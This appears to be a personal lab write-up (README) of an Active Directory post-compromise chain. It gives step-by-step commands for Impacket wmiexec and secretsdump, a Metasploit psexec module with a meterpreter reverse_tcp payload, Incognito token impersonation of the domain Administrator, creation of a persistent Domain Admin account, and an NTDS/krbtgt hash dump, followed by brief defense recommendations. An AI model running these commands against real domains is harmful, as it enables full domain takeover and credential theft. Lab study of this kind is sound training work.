# 🛡️ Active Directory Post-Compromise (Token Impersonation → Domain Dump)

![Platform](https://img.shields.io/badge/Platform-Active%20Directory-blue)
![Tool](https://img.shields.io/badge/Tool-Metasploit-purple)
![Tool](https://img.shields.io/badge/Tool-Impacket-orange)
![Attack](https://img.shields.io/badge/Attack-Token%20Impersonation-red)
![Technique](https://img.shields.io/badge/Technique-Privilege%20Escalation-yellow)
![Status](https://img.shields.io/badge/Status-Completed-success)

---

## 📌 Overview

In this lab, I performed a **post-compromise attack in an Active Directory environment** using **Meterpreter (Metasploit)** and **Impacket tools**.

This lab also included **real-world troubleshooting scenarios**, where default attack paths failed due to modern Windows security controls.

The attack flow included:

- Token impersonation
- Privilege escalation to SYSTEM
- Domain Admin impersonation
- Creating a persistent user
- Dumping domain credentials (NTDS.dit)

---

## 🎯 Objectives

- Gain SYSTEM-level access on a domain-joined machine
- Enumerate and impersonate available tokens
- Escalate privileges to Domain Admin
- Create a new domain admin user (persistence)
- Dump NTDS (Active Directory database)

---

## 🧪 Lab Environment

- **Attacker:** Kali Linux
- **Victim Machine:** `<TARGET_MACHINE>`
- **Domain Controller:** `<DC_MACHINE>`
- **Domain:** `<DOMAIN_NAME>`

---

## ⚙️ Tools Used

- Metasploit Framework (Meterpreter)
- Incognito (Token manipulation)
- Impacket (`wmiexec`, `secretsdump`)
- CrackMapExec
- Windows CMD

---

## ⚠️ Issues Faced (Real Lab Challenges)

During the attack, the following issues were encountered:

- `psexec → ACCESS_DENIED`
- Payload blocked by Windows Defender
- Meterpreter session initially failed
- Confusion between WMI shell and Meterpreter shell

### 🔍 Root Cause

- Modern Windows security (Defender + UAC)
- Service-based execution blocked
- AV detection on payload execution

### ✅ Solution

- Switched to **Impacket wmiexec (low-noise execution)**
- Disabled Defender (lab environment)
- Re-established Meterpreter session successfully

---

## 🚀 Attack Flow

### 🔹 Step 1 – Initial Access (WMI Execution)

```bash
impacket-wmiexec <DOMAIN_NAME>/<USER>:<PASSWORD>@<TARGET_IP>
```

### 🔹 Step 2 – Dump Local Credentials

```bash
impacket-secretsdump <DOMAIN_NAME>/<USER>:<PASSWORD>@<TARGET_IP>
```

### 🔹 Step 3 – Gain Meterpreter Session

```bash
use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_tcp
set RHOSTS <TARGET_IP>
set SMBUser <USER>
set SMBPass <PASSWORD>
set SMBDomain <DOMAIN_NAME>
run
```

### 🔹 Step 4 – Load Incognito

```bash
load incognito
```

### 🔹 Step 5 – List Available Tokens

```bash
list_tokens -u
```

### 🔹 Step 6 – Impersonate Domain Administrator

```bash
impersonate_token <DOMAIN_NAME>\\Administrator
```

### 🔹 Step 7 – Confirm Identity

```bash
getuid
```

### Expected:

```bash
<DOMAIN_NAME>\Administrator
```

### 🔹 Step 8 – Create New Domain User

```bash
net user testuser Password1@ /add /domain
```

### 🔹 Step 9 – Add User to Domain Admins

```bash
net group "Domain Admins" testuser /ADD /DOMAIN
```

### ✔️ Full domain control achieved

### 🔹 Step 10 – Dump Domain Credentials (NTDS)

```bash
impacket-secretsdump <DOMAIN_NAME>/testuser:'Password1@'@<DC_IP>
```

### 📊 Results

Successfully extracted:

- Local SAM hashes
- LSA Secrets
- Domain user hashes
- Kerberos keys
- NTDS.dit database

### 🔥 Key Accounts Dumped

- Administrator
- krbtgt (🔥 Critical)
- SQLService -<USER>
- testuser

### 🧠 Key Learnings

- Token impersonation can lead to full domain compromise
- SYSTEM access ≠ Domain Admin (token impersonation required)
- Modern Windows may block traditional tools (psexec)
- wmiexec is more stealthy and reliable
- Defender can break exploit chains
- Persistence via domain user creation is highly effective

### 🛡️ Defense Recommendations

- Limit token impersonation privileges
- Implement account tiering (Tier 0 / Tier 1 / Tier 2)
- Never allow Domain Admin login on workstations
- Restrict local admin privileges
- Use LAPS for unique admin passwords
- Monitor suspicious account creation
- Enable logging for privilege escalation and token usage

### 📸 Screenshots

### 🔚 Conclusion

This lab demonstrates a complete Active Directory post-compromise attack chain:

- Initial access (WMI)
- Credential dumping
- Meterpreter access
- Token impersonation
- Domain Admin escalation
- Persistence (new admin user)
- Full domain credential dump

### 📎 Author

- GitHub: https://github.com/bilalhunzla
- LinkedIn: https://www.linkedin.com/in/hunzla-bilal
